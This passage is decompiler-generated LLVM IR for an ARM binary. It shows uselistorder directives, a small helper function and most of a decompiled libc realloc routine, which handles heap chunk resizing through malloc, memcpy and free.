  uselistorder i32 %v2_15658, { 1, 2, 0, 3 }
  uselistorder i32 %v2_15650, { 1, 0, 2 }
  uselistorder i32 %v1_1564c, { 2, 1, 0 }
  uselistorder i32 %v0_1564c, { 3, 1, 2, 0 }
  uselistorder i32 %v1_15630, { 1, 0 }
  uselistorder i32 %v2_15608, { 1, 0 }
  uselistorder i32 %v3_155fc, { 1, 0, 2 }
  uselistorder i32 %v2_155dc, { 1, 0, 2 }
  uselistorder i32* %v2_155d4, { 1, 0, 2 }
  uselistorder i32 %v0_155bc, { 1, 0 }
  uselistorder i32 %v6_15598, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v0_15584, { 2, 1, 0 }
  uselistorder i32 %v0_1556c, { 1, 0 }
  uselistorder i32 %v2_15528, { 1, 0, 2, 3 }
  uselistorder i32 %v1_15524, { 1, 0 }
  uselistorder i32 %v3_154fc, { 0, 3, 1, 2, 4, 5 }
  uselistorder i32 %v2_154dc, { 1, 0, 2 }
  uselistorder i32 %v2_154c4, { 1, 2, 0, 3 }
  uselistorder i32 %v1_1546c, { 2, 1, 0 }
  uselistorder i32 %v6_15460, { 3, 4, 2, 1, 0, 5 }
  uselistorder i32 %v3_1543c, { 2, 1, 0, 3 }
  uselistorder i32 %v3_153fc, { 1, 0, 2, 3 }
  uselistorder i32 %v0_153bc, { 5, 6, 7, 0, 1, 8, 3, 2, 4, 9 }
  uselistorder i32 %v3_153b4, { 1, 0, 2, 3 }
  uselistorder i32 %v4_153b0, { 1, 0, 2, 3, 4, 5, 6 }
  uselistorder i32 %v0_1539c, { 1, 0 }
  uselistorder i32 %v7_1535c, { 1, 0 }
  uselistorder i32 %v4_1535c, { 1, 0 }
  uselistorder i32 %v0_1532c, { 1, 0 }
  uselistorder i32 %v2_15300, { 3, 2, 1, 0 }
  uselistorder i32 %ip.promoted, { 2, 0, 1 }
  uselistorder i32 %v0_152fc54, { 1, 0 }
  uselistorder i32 %v1_152c8, { 1, 2, 0, 4, 3 }
  uselistorder i32 %v1_152b0., { 1, 2, 0 }
  uselistorder i32 %v0_152b8, { 0, 1, 3, 2 }
  uselistorder i32 %v1_152b8, { 1, 0 }
  uselistorder i32 %v3_15298, { 1, 0 }
  uselistorder i32 %v4_15294, { 1, 0, 2 }
  uselistorder i32 %v1_15204, { 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_1525c, { 1, 0 }
  uselistorder i32 %v1_15240, { 1, 0 }
  uselistorder i32 %v1_150e0, { 1, 0 }
  uselistorder i32 %v0_15220, { 2, 0, 1, 3 }
  uselistorder i32 %v3_151e8, { 2, 0, 1, 3 }
  uselistorder i32 %v0_1527c.pre, { 1, 2, 0 }
  uselistorder i32 %v0_151c4, { 2, 1, 0 }
  uselistorder i32 %v3_151b8, { 5, 6, 4, 3, 2, 0, 1 }
  uselistorder i32 %v0_150d8, { 0, 5, 4, 3, 1, 2 }
  uselistorder i32 %v1_15180, { 1, 0 }
  uselistorder i32 %v3_15174, { 1, 0 }
  uselistorder i32 %v0_15180, { 1, 0 }
  uselistorder i32 %v3_15158, { 0, 2, 3, 1 }
  uselistorder i32 %v2_15148, { 1, 0, 2 }
  uselistorder i32 %v3_15100, { 2, 1, 0 }
  uselistorder i32 %v0_150f0, { 3, 2, 1, 0 }
  uselistorder i32 %v0_150c0, { 1, 0 }
  uselistorder i32 %v1_15074, { 2, 1, 0, 3 }
  uselistorder i32 %v0_15070, { 4, 2, 1, 3, 0 }
  uselistorder i32 %v3_15014, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v3_15008, { 1, 0 }
  uselistorder i32 %v3_14fd8, { 1, 0 }
  uselistorder i32 %v0_14fcc, { 5, 6, 4, 2, 0, 3, 1 }
  uselistorder i32 %v2_14fac, { 0, 2, 1, 3 }
  uselistorder i1 %v7_14fa0, { 1, 0 }
  uselistorder i32 %v0_14f78, { 1, 0 }
  uselistorder i32* %r8.global-to-local, { 2, 0, 1 }
  uselistorder i32* %r5.global-to-local, { 2, 1, 0 }
  uselistorder i32* %r4.global-to-local, { 13, 0, 1, 2, 3, 4, 6, 5, 8, 9, 7, 10, 11, 12, 14, 15, 16 }
  uselistorder i32* %r3.global-to-local, { 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 44, 41, 42, 43, 45, 46, 47, 48, 1, 2, 49, 50, 51, 52, 53, 54, 55, 56, 57, 62, 58, 59, 60, 61, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 82, 90, 77, 78, 79, 80, 81, 83, 84, 85, 86, 0, 87, 88, 89, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109 }
  uselistorder i32* %r2.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 31, 30, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 50, 43, 44, 45, 46, 47, 48, 49, 51, 52, 53, 54, 55, 56, 57 }
  uselistorder i32* %r1.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 20, 19, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 47, 42, 43, 44, 45, 46, 48, 49, 50, 51, 52, 53, 54, 55 }
  uselistorder i32* %r0.global-to-local, { 4, 2, 30, 3, 5, 6, 7, 19, 11, 8, 20, 9, 10, 13, 12, 17, 14, 21, 16, 15, 22, 18, 26, 24, 23, 25, 28, 27, 31, 29, 36, 32, 33, 1, 34, 35, 37, 38, 39, 42, 43, 40, 41, 48, 45, 44, 46, 47, 49, 54, 50, 51, 52, 53, 56, 55, 59, 58, 57, 0 }
  uselistorder i32* %lr.global-to-local, { 0, 1, 2, 3, 4, 7, 5, 6, 8, 9, 10, 11, 12, 13 }
  uselistorder i32* %ip.global-to-local, { 2, 3, 4, 5, 6, 7, 8, 9, 12, 11, 13, 10, 14, 15, 16, 17, 18, 19, 20, 21, 22, 1, 23, 24, 36, 35, 28, 25, 0, 26, 27, 29, 30, 31, 32, 33, 34, 37, 38, 39, 40, 41, 42 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32)* @mmap, { 1, 0 }
  uselistorder i32 (i32)* @__malloc_largebin_index, { 1, 0 }
  uselistorder label %dec_label_pc_15810, { 1, 0 }
  uselistorder label %dec_label_pc_157f4, { 7, 1, 2, 3, 4, 5, 6, 0 }
  uselistorder label %dec_label_pc_157f0, { 4, 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_157e0, { 1, 2, 0 }
  uselistorder label %bb168, { 1, 0 }
  uselistorder label %bb166, { 1, 0 }
  uselistorder label %dec_label_pc_15774, { 4, 1, 2, 3, 0 }
  uselistorder label %dec_label_pc_156f0, { 3, 1, 0, 2 }
  uselistorder label %dec_label_pc_156e8, { 1, 0 }
  uselistorder label %bb164, { 1, 0 }
  uselistorder label %.thread44, { 1, 0 }
  uselistorder label %.thread43, { 1, 0 }
  uselistorder label %.thread40, { 3, 0, 2, 1 }
  uselistorder label %dec_label_pc_155bc, { 1, 0 }
  uselistorder label %.thread32, { 1, 0 }
  uselistorder label %bb157, { 1, 0 }
  uselistorder label %bb153, { 1, 0 }
  uselistorder label %dec_label_pc_154f0, { 2, 0, 3, 1 }
  uselistorder label %bb150, { 1, 0 }
  uselistorder label %bb148, { 1, 0 }
  uselistorder label %.thread27, { 1, 0 }
  uselistorder label %dec_label_pc_153a8, { 0, 2, 1 }
  uselistorder label %.thread121, { 1, 0 }
  uselistorder label %bb144, { 1, 0 }
  uselistorder label %dec_label_pc_152fc, { 1, 0 }
  uselistorder label %dec_label_pc_15304.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_152c8, { 1, 0 }
  uselistorder label %dec_label_pc_1527c, { 1, 0 }
  uselistorder label %dec_label_pc_15210, { 1, 0 }
  uselistorder label %dec_label_pc_1520c, { 1, 0 }
  uselistorder label %dec_label_pc_151b8, { 1, 0 }
  uselistorder label %dec_label_pc_151a4, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1516c, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_15158, { 1, 0 }
  uselistorder label %bb140, { 1, 0 }
  uselistorder label %bb138, { 1, 0 }
}

define i32 @function_15824(i32 %arg1) local_unnamed_addr {
dec_label_pc_15824:
  %v0_15824 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_15824, label %bb, label %.thread4

bb:                                               ; preds = %dec_label_pc_15824
  br label %.thread4

.thread4:                                         ; preds = %dec_label_pc_15824, %bb
  %v10_15838 = phi i32 [ %arg1, %dec_label_pc_15824 ], [ 0, %bb ]
  ret i32 %v10_15838

; uselistorder directives
  uselistorder label %.thread4, { 1, 0 }
}

define i32 @realloc(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* @r0, align 4
  %stack_var_-56 = alloca i32, align 4
  %v3_1583c = load i32, i32* @r4, align 4
  %v6_1583c = load i32, i32* @r5, align 4
  %v9_1583c = load i32, i32* @r6, align 4
  %v12_1583c = load i32, i32* @r7, align 4
  %v15_1583c = load i32, i32* @r8, align 4
  %v18_1583c = load i32, i32* @sb, align 4
  %v21_1583c = load i32, i32* @sl, align 4
  %v24_1583c = load i32, i32* @fp, align 4
  %v27_1583c = load i32, i32* @lr, align 4
  store i32 %tmp, i32* @r5, align 4
  %v2_15848 = icmp eq i32* %arg1, null
  store i32 ptrtoint (i32* @global_var_28010.981 to i32), i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* @r6, align 4
  br i1 %v2_15848, label %dec_label_pc_1585c, label %dec_label_pc_1586c

dec_label_pc_1585c:                               ; preds = %entry
  store i32 %arg2, i32* %r0.global-to-local, align 4
  %v1_15860 = call i32 @malloc(i32 %arg2)
  store i32 %v1_15860, i32* %r0.global-to-local, align 4
  store i32 %v1_15860, i32* @r4, align 4
  br label %dec_label_pc_15bc4

dec_label_pc_1586c:                               ; preds = %entry
  %v2_1586c = icmp eq i32 %arg2, 0
  br i1 %v2_1586c, label %dec_label_pc_15874, label %dec_label_pc_15880

dec_label_pc_15874:                               ; preds = %dec_label_pc_1586c
  %v0_15874 = call i32 @free()
  store i32 %v0_15874, i32* %r0.global-to-local, align 4
  %v0_15878 = load i32, i32* @r6, align 4
  store i32 %v0_15878, i32* @r4, align 4
  br label %dec_label_pc_15bc4

dec_label_pc_15880:                               ; preds = %dec_label_pc_1586c
  store i32 76, i32* %r3.global-to-local, align 4
  %v4_15888 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_28010.981 to i32), i32 76) to i32*), align 4
  store i32 %v4_15888, i32* @r4, align 4
  store i32 40, i32* %r3.global-to-local, align 4
  store i32 %v4_15888, i32* %r2.global-to-local, align 4
  %v4_15894 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_28010.981 to i32), i32 40) to i32*), align 4
  store i32 %v4_15894, i32* %r1.global-to-local, align 4
  %v2_15898 = ptrtoint i32* %stack_var_-56 to i32
  store i32 %v2_15898, i32* %r0.global-to-local, align 4
  store i32 80, i32* %r3.global-to-local, align 4
  %v4_158a0 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_28010.981 to i32), i32 80) to i32*), align 4
  call void @__pseudo_branch(i32 %v4_158a0)
  %v0_158ac = load i32, i32* @r4, align 4
  store i32 %v0_158ac, i32* %r0.global-to-local, align 4
  store i32 20, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_28010.981 to i32), i32* %r1.global-to-local, align 4
  %v4_158b8 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_28010.981 to i32), i32 20) to i32*), align 4
  store i32 %v4_158b8, i32* @ip, align 4
  store i32 ptrtoint (i32* @global_var_158c4.1135 to i32), i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_158b8)
  %v0_158c4 = load i32, i32* @r6, align 4
  %tmp36 = icmp ult i32 %v0_158c4, -32
  br i1 %tmp36, label %dec_label_pc_158e0, label %dec_label_pc_158cc

dec_label_pc_158cc:                               ; preds = %dec_label_pc_15880
  %v0_158cc = call i32 @__GI___errno_location()
  store i32 %v0_158cc, i32* %r0.global-to-local, align 4
  store i32 0, i32* @r4, align 4
  store i32 12, i32* %r3.global-to-local, align 4
  %v2_158d8 = inttoptr i32 %v0_158cc to i32*
  store i32 12, i32* %v2_158d8, align 4
  br label %dec_label_pc_15bc4

dec_label_pc_158e0:                               ; preds = %dec_label_pc_15880
  %v1_158e0 = add i32 %v0_158c4, 11
  store i32 %v1_158e0, i32* %r0.global-to-local, align 4
  %v0_158e4 = load i32, i32* @r5, align 4
  %v1_158e4 = add i32 %v0_158e4, -4
  %v2_158e4 = inttoptr i32 %v1_158e4 to i32*
  %v3_158e4 = load i32, i32* %v2_158e4, align 4
  store i32 %v3_158e4, i32* %r2.global-to-local, align 4
  %v2_158e8 = icmp ugt i32 %v1_158e0, 14
  %v7_158e8 = icmp eq i32 %v1_158e0, 15
  %v2_158ec = xor i1 %v2_158e8, true
  %v3_158ec = or i1 %v7_158e8, %v2_158ec
  br i1 %v3_158ec, label %bb, label %bb27

bb:                                               ; preds = %dec_label_pc_158e0
  store i32 16, i32* @sb, align 4
  br label %bb27

bb27:                                             ; preds = %dec_label_pc_158e0, %bb
  %v2_158f0 = xor i1 %v7_158e8, true
  %v3_158f0 = and i1 %v2_158e8, %v2_158f0
  br i1 %v3_158f0, label %bb28, label %bb29

bb28:                                             ; preds = %bb27
  %v5_158f0 = and i32 %v1_158e0, -8
  store i32 %v5_158f0, i32* @sb, align 4
  br label %bb29

bb29:                                             ; preds = %bb27, %bb28
  %v1_158f4 = and i32 %v3_158e4, 2
  %v2_158f4 = icmp eq i32 %v1_158f4, 0
  %v1_158f8 = add i32 %v0_158e4, -8
  store i32 %v1_158f8, i32* @sl, align 4
  %v1_158fc = and i32 %v3_158e4, -4
  store i32 %v1_158fc, i32* @r6, align 4
  br i1 %v2_158f4, label %dec_label_pc_15904, label %dec_label_pc_15adc

dec_label_pc_15904:                               ; preds = %bb29
  %v1_15904 = load i32, i32* @sb, align 4
  %v3_15904 = icmp ult i32 %v1_158fc, %v1_15904
  br i1 %v3_15904, label %dec_label_pc_15910, label %bb30

bb30:                                             ; preds = %dec_label_pc_15904
  store i32 %v1_158fc, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_15a74

dec_label_pc_15910:                               ; preds = %dec_label_pc_15904
  store i32 36, i32* %r3.global-to-local, align 4
  %v4_15918 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_28010.981 to i32), i32 36) to i32*), align 4
  store i32 %v4_15918, i32* %r0.global-to-local, align 4
  %v1_1591c = add i32 %v4_15918, 44
  %v2_1591c = inttoptr i32 %v1_1591c to i32*
  %v3_1591c = load i32, i32* %v2_1591c, align 4
  store i32 %v3_1591c, i32* %r3.global-to-local, align 4
  %v2_15920 = add i32 %v1_158fc, %v1_158f8
  store i32 %v2_15920, i32* @r4, align 4
  %v9_15924 = icmp eq i32 %v2_15920, %v3_1591c
  %v1_15928 = add i32 %v2_15920, 4
  %v2_15928 = inttoptr i32 %v1_15928 to i32*
  %v3_15928 = load i32, i32* %v2_15928, align 4
  store i32 %v3_15928, i32* %r1.global-to-local, align 4
  br i1 %v9_15924, label %dec_label_pc_15930, label %dec_label_pc_1596c

dec_label_pc_15930:                               ; preds = %dec_label_pc_15910
  %v1_15930 = and i32 %v3_15928, -4
  %v2_15934 = add i32 %v1_15930, %v1_158fc
  store i32 %v2_15934, i32* %r1.global-to-local, align 4
  %v1_15938 = add i32 %v1_15904, 16
  store i32 %v1_15938, i32* %r3.global-to-local, align 4
  %v3_1593c = icmp ult i32 %v2_15934, %v1_15938
  br i1 %v3_1593c, label %dec_label_pc_159c0, label %dec_label_pc_15944

dec_label_pc_15944:                               ; preds = %dec_label_pc_15930
  %v2_15944 = sub i32 %v2_15934, %v1_15904
  %v1_15948 = urem i32 %v3_158e4, 2
  %v2_1594c = add i32 %v1_15904, %v1_158f8
  store i32 %v2_1594c, i32* %r1.global-to-local, align 4
  %v2_15950 = or i32 %v1_15904, %v1_15948
  store i32 %v2_15950, i32* %r2.global-to-local, align 4
  %v1_15954 = or i32 %v2_15944, 1
  store i32 %v1_15954, i32* %r3.global-to-local, align 4
  store i32 %v0_158e4, i32* @r4, align 4
  store i32 %v2_15950, i32* %v2_158e4, align 4
  %v0_15960 = load i32, i32* %r1.global-to-local, align 4
  %v1_15960 = load i32, i32* %r0.global-to-local, align 4
  %v2_15960 = add i32 %v1_15960, 44
  %v3_15960 = inttoptr i32 %v2_15960 to i32*
  store i32 %v0_15960, i32* %v3_15960, align 4
  %v0_15964 = load i32, i32* %r3.global-to-local, align 4
  %v1_15964 = load i32, i32* %r1.global-to-local, align 4
  %v2_15964 = add i32 %v1_15964, 4
  %v3_15964 = inttoptr i32 %v2_15964 to i32*
  store i32 %v0_15964, i32* %v3_15964, align 4
  br label %dec_label_pc_15ba8

dec_label_pc_1596c:                               ; preds = %dec_label_pc_15910
  %v1_1596c = and i32 %v3_15928, -2
  %v2_15970 = add i32 %v1_1596c, %v2_15920
  store i32 %v2_15970, i32* %r3.global-to-local, align 4
  %v1_15974 = add i32 %v2_15970, 4
  %v2_15974 = inttoptr i32 %v1_15974 to i32*
  %v3_15974 = load i32, i32* %v2_15974, align 4
  store i32 %v3_15974, i32* %r3.global-to-local, align 4
  %v1_15978 = urem i32 %v3_15974, 2
  %v2_15978 = icmp eq i32 %v1_15978, 0
  br i1 %v2_15978, label %dec_label_pc_15980, label %dec_label_pc_159c0

dec_label_pc_15980:                               ; preds = %dec_label_pc_1596c
  %v1_15980 = and i32 %v3_15928, -4
  store i32 %v1_15980, i32* %r3.global-to-local, align 4
  %v2_15984 = add i32 %v1_15980, %v1_158fc
  store i32 %v2_15984, i32* %r0.global-to-local, align 4
  %v3_15988 = icmp ult i32 %v2_15984, %v1_15904
  br i1 %v3_15988, label %dec_label_pc_159c0, label %dec_label_pc_15990

dec_label_pc_15990:                               ; preds = %dec_label_pc_15980
  %v1_15990 = add i32 %v1_158fc, %v0_158e4
  %v2_15990 = inttoptr i32 %v1_15990 to i32*
  %v3_15990 = load i32, i32* %v2_15990, align 4
  store i32 %v3_15990, i32* %r1.global-to-local, align 4
  %v1_15994 = add i32 %v3_15990, 12
  %v2_15994 = inttoptr i32 %v1_15994 to i32*
  %v3_15994 = load i32, i32* %v2_15994, align 4
  store i32 %v3_15994, i32* %r3.global-to-local, align 4
  %v9_15998 = icmp eq i32 %v3_15994, %v2_15920
  %v1_1599c = add i32 %v2_15920, 12
  %v2_1599c = inttoptr i32 %v1_1599c to i32*
  %v3_1599c = load i32, i32* %v2_1599c, align 4
  store i32 %v3_1599c, i32* %r2.global-to-local, align 4
  br i1 %v9_15998, label %dec_label_pc_159a4, label %dec_label_pc_159b0

dec_label_pc_159a4:                               ; preds = %dec_label_pc_15990
  %v1_159a4 = add i32 %v3_1599c, 8
  %v2_159a4 = inttoptr i32 %v1_159a4 to i32*
  %v3_159a4 = load i32, i32* %v2_159a4, align 4
  store i32 %v3_159a4, i32* %r3.global-to-local, align 4
  %v9_159a8 = icmp eq i32 %v3_159a4, %v2_15920
  br i1 %v9_159a8, label %dec_label_pc_159b4, label %dec_label_pc_159b0

dec_label_pc_159b0:                               ; preds = %dec_label_pc_15990, %dec_label_pc_159a4
  %v0_159b0 = call i32 @abort()
  store i32 %v0_159b0, i32* %r0.global-to-local, align 4
  %v0_159b4.pre = load i32, i32* @r1, align 4
  %v1_159b4.pre = load i32, i32* @r2, align 4
  br label %dec_label_pc_159b4

dec_label_pc_159b4:                               ; preds = %dec_label_pc_159a4, %dec_label_pc_159b0
  %v1_159b4 = phi i32 [ %v3_1599c, %dec_label_pc_159a4 ], [ %v1_159b4.pre, %dec_label_pc_159b0 ]
  %v0_159b4 = phi i32 [ %v3_15990, %dec_label_pc_159a4 ], [ %v0_159b4.pre, %dec_label_pc_159b0 ]
  %v2_159b4 = add i32 %v1_159b4, 8
  %v3_159b4 = inttoptr i32 %v2_159b4 to i32*
  store i32 %v0_159b4, i32* %v3_159b4, align 4
  %v0_159b8 = load i32, i32* %r2.global-to-local, align 4
  %v1_159b8 = load i32, i32* %r1.global-to-local, align 4
  %v2_159b8 = add i32 %v1_159b8, 12
  %v3_159b8 = inttoptr i32 %v2_159b8 to i32*
  store i32 %v0_159b8, i32* %v3_159b8, align 4
  %v1_15a74.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_15a74

dec_label_pc_159c0:                               ; preds = %dec_label_pc_15930, %dec_label_pc_15980, %dec_label_pc_1596c
  %v1_159c0 = add i32 %v1_15904, -7
  store i32 %v1_159c0, i32* %r0.global-to-local, align 4
  %v1_159c4 = call i32 @malloc(i32 %v1_159c0)
  store i32 %v1_159c4, i32* @r0, align 4
  store i32 %v1_159c4, i32* %r1.global-to-local, align 4
  %v2_159c8 = icmp eq i32 %v1_159c4, 0
  br i1 %v2_159c8, label %bb31, label %dec_label_pc_159d4

bb31:                                             ; preds = %dec_label_pc_159c0
  store i32 0, i32* @r4, align 4
  br label %dec_label_pc_15ba8

dec_label_pc_159d4:                               ; preds = %dec_label_pc_159c0
  %v1_159dc.pre = load i32, i32* @r4, align 4
  %v1_159d4 = add i32 %v1_159c4, -4
  %v2_159d4 = inttoptr i32 %v1_159d4 to i32*
  %v3_159d4 = load i32, i32* %v2_159d4, align 4
  store i32 %v3_159d4, i32* @r3, align 4
  %v1_159d8 = add i32 %v1_159c4, -8
  store i32 %v1_159d8, i32* @r7, align 4
  %v9_159dc = icmp eq i32 %v1_159d8, %v1_159dc.pre
  br i1 %v9_159dc, label %.thread2, label %dec_label_pc_159ec

.thread2:                                         ; preds = %dec_label_pc_159d4
  %v2_159e0 = and i32 %v3_159d4, -4
  store i32 %v2_159e0, i32* %r3.global-to-local, align 4
  %v2_159e4 = load i32, i32* @r6, align 4
  %v3_159e4 = add i32 %v2_159e4, %v2_159e0
  store i32 %v3_159e4, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_15a74

dec_label_pc_159ec:                               ; preds = %dec_label_pc_159d4
  %v0_159ec = load i32, i32* @r6, align 4
  %v1_159ec = add i32 %v0_159ec, -4
  store i32 %v1_159ec, i32* @r2, align 4
  %v3_159f0 = udiv i32 %v1_159ec, 4
  store i32 %v3_159f0, i32* @ip, align 4
  %tmp37 = and i32 %v1_159ec, -4
  %tmp38 = icmp eq i32 %tmp37, 36
  %v2_159f8 = icmp ult i32 %v1_159ec, 36
  %v3_159f8 = or i1 %tmp38, %v2_159f8
  %v0_15a08 = load i32, i32* @r5, align 4
  br i1 %v3_159f8, label %dec_label_pc_15a08, label %dec_label_pc_159fc

dec_label_pc_159fc:                               ; preds = %dec_label_pc_159ec
  store i32 %v0_15a08, i32* @r1, align 4
  %v0_15a00 = call i32 @memcpy()
  store i32 %v0_15a00, i32* %r0.global-to-local, align 4
  br label %.thread6

dec_label_pc_15a08:                               ; preds = %dec_label_pc_159ec
  %v1_15a08 = inttoptr i32 %v0_15a08 to i32*
  %v2_15a08 = load i32, i32* %v1_15a08, align 4
  store i32 %v2_15a08, i32* %r3.global-to-local, align 4
  %v2_15a0c = inttoptr i32 %v1_159c4 to i32*
  store i32 %v2_15a08, i32* %v2_15a0c, align 4
  %v0_15a10 = load i32, i32* @r5, align 4
  %v1_15a10 = add i32 %v0_15a10, 4
  %v2_15a10 = inttoptr i32 %v1_15a10 to i32*
  %v3_15a10 = load i32, i32* %v2_15a10, align 4
  store i32 %v3_15a10, i32* %r3.global-to-local, align 4
  %v1_15a14 = load i32, i32* %r1.global-to-local, align 4
  %v2_15a14 = add i32 %v1_15a14, 4
  %v3_15a14 = inttoptr i32 %v2_15a14 to i32*
  store i32 %v3_15a10, i32* %v3_15a14, align 4
  %v0_15a18 = load i32, i32* @r5, align 4
  %v1_15a18 = add i32 %v0_15a18, 8
  %v2_15a18 = inttoptr i32 %v1_15a18 to i32*
  %v3_15a18 = load i32, i32* %v2_15a18, align 4
  store i32 %v3_15a18, i32* %r3.global-to-local, align 4
  %v0_15a1c = load i32, i32* @ip, align 4
  %v1_15a20 = load i32, i32* %r1.global-to-local, align 4
  %v2_15a20 = add i32 %v1_15a20, 8
  %v3_15a20 = inttoptr i32 %v2_15a20 to i32*
  store i32 %v3_15a18, i32* %v3_15a20, align 4
  %tmp39 = icmp ult i32 %v0_15a1c, 5
  br i1 %tmp39, label %.thread6, label %dec_label_pc_15a28

dec_label_pc_15a28:                               ; preds = %dec_label_pc_15a08
  %v0_15a28 = load i32, i32* @r5, align 4
  %v1_15a28 = add i32 %v0_15a28, 12
  %v2_15a28 = inttoptr i32 %v1_15a28 to i32*
  %v3_15a28 = load i32, i32* %v2_15a28, align 4
  store i32 %v3_15a28, i32* %r3.global-to-local, align 4
  %v1_15a2c = load i32, i32* %r1.global-to-local, align 4
  %v2_15a2c = add i32 %v1_15a2c, 12
  %v3_15a2c = inttoptr i32 %v2_15a2c to i32*
  store i32 %v3_15a28, i32* %v3_15a2c, align 4
  %v0_15a30 = load i32, i32* @r5, align 4
  %v1_15a30 = add i32 %v0_15a30, 16
  %v2_15a30 = inttoptr i32 %v1_15a30 to i32*
  %v3_15a30 = load i32, i32* %v2_15a30, align 4
  store i32 %v3_15a30, i32* %r3.global-to-local, align 4
  %v0_15a34 = load i32, i32* @ip, align 4
  %v1_15a38 = load i32, i32* %r1.global-to-local, align 4
  %v2_15a38 = add i32 %v1_15a38, 16
  %v3_15a38 = inttoptr i32 %v2_15a38 to i32*
  store i32 %v3_15a30, i32* %v3_15a38, align 4
  %tmp40 = icmp ult i32 %v0_15a34, 7
  br i1 %tmp40, label %.thread6, label %dec_label_pc_15a40

dec_label_pc_15a40:                               ; preds = %dec_label_pc_15a28
  %v0_15a40 = load i32, i32* @r5, align 4
  %v1_15a40 = add i32 %v0_15a40, 20
  %v2_15a40 = inttoptr i32 %v1_15a40 to i32*
  %v3_15a40 = load i32, i32* %v2_15a40, align 4
  store i32 %v3_15a40, i32* %r3.global-to-local, align 4
  %v1_15a44 = load i32, i32* %r1.global-to-local, align 4
  %v2_15a44 = add i32 %v1_15a44, 20
  %v3_15a44 = inttoptr i32 %v2_15a44 to i32*
  store i32 %v3_15a40, i32* %v3_15a44, align 4
  %v0_15a48 = load i32, i32* @r5, align 4
  %v1_15a48 = add i32 %v0_15a48, 24
  %v2_15a48 = inttoptr i32 %v1_15a48 to i32*
  %v3_15a48 = load i32, i32* %v2_15a48, align 4
  store i32 %v3_15a48, i32* %r3.global-to-local, align 4
  %v1_15a4c = load i32, i32* %r1.global-to-local, align 4
  %v2_15a4c = add i32 %v1_15a4c, 24
  %v3_15a4c = inttoptr i32 %v2_15a4c to i32*
  store i32 %v3_15a48, i32* %v3_15a4c, align 4
  %v0_15a50 = load i32, i32* @ip, align 4
  %v7_15a50 = icmp eq i32 %v0_15a50, 9
  br i1 %v7_15a50, label %bb32, label %.thread6

bb32:                                             ; preds = %dec_label_pc_15a40
  %v1_15a54 = load i32, i32* @r5, align 4
  %v2_15a54 = add i32 %v1_15a54, 28
  %v3_15a54 = inttoptr i32 %v2_15a54 to i32*
  %v4_15a54 = load i32, i32* %v3_15a54, align 4
  store i32 %v4_15a54, i32* %r3.global-to-local, align 4
  %v2_15a58 = load i32, i32* %r1.global-to-local, align 4
  %v3_15a58 = add i32 %v2_15a58, 28
  %v4_15a58 = inttoptr i32 %v3_15a58 to i32*
  store i32 %v4_15a54, i32* %v4_15a58, align 4
  %v1_15a5c = load i32, i32* @r5, align 4
  %v2_15a5c = add i32 %v1_15a5c, 32
  %v3_15a5c = inttoptr i32 %v2_15a5c to i32*
  %v4_15a5c = load i32, i32* %v3_15a5c, align 4
  store i32 %v4_15a5c, i32* %r3.global-to-local, align 4
  %v2_15a60 = load i32, i32* %r1.global-to-local, align 4
  %v3_15a60 = add i32 %v2_15a60, 32
  %v4_15a60 = inttoptr i32 %v3_15a60 to i32*
  store i32 %v4_15a5c, i32* %v4_15a60, align 4
  br label %.thread6

.thread6:                                         ; preds = %dec_label_pc_15a40, %dec_label_pc_15a28, %dec_label_pc_15a08, %dec_label_pc_159fc, %bb32
  %v0_15a64 = load i32, i32* @r5, align 4
  store i32 %v0_15a64, i32* @r0, align 4
  %v0_15a68 = call i32 @free()
  store i32 %v0_15a68, i32* %r0.global-to-local, align 4
  %v0_15a6c = load i32, i32* @r7, align 4
  %v1_15a6c = add i32 %v0_15a6c, 8
  store i32 %v1_15a6c, i32* @r4, align 4
  br label %dec_label_pc_15ba8

dec_label_pc_15a74:                               ; preds = %bb30, %.thread2, %dec_label_pc_159b4
  %v0_15a88 = phi i32 [ %v3_159e4, %.thread2 ], [ %v1_158fc, %bb30 ], [ %v1_15a74.pre, %dec_label_pc_159b4 ]
  %v0_15a74 = load i32, i32* @sb, align 4
  %v2_15a74 = sub i32 %v0_15a88, %v0_15a74
  store i32 %v2_15a74, i32* %r1.global-to-local, align 4
  %v0_15a7c = load i32, i32* @sl, align 4
  %v1_15a7c = add i32 %v0_15a7c, 4
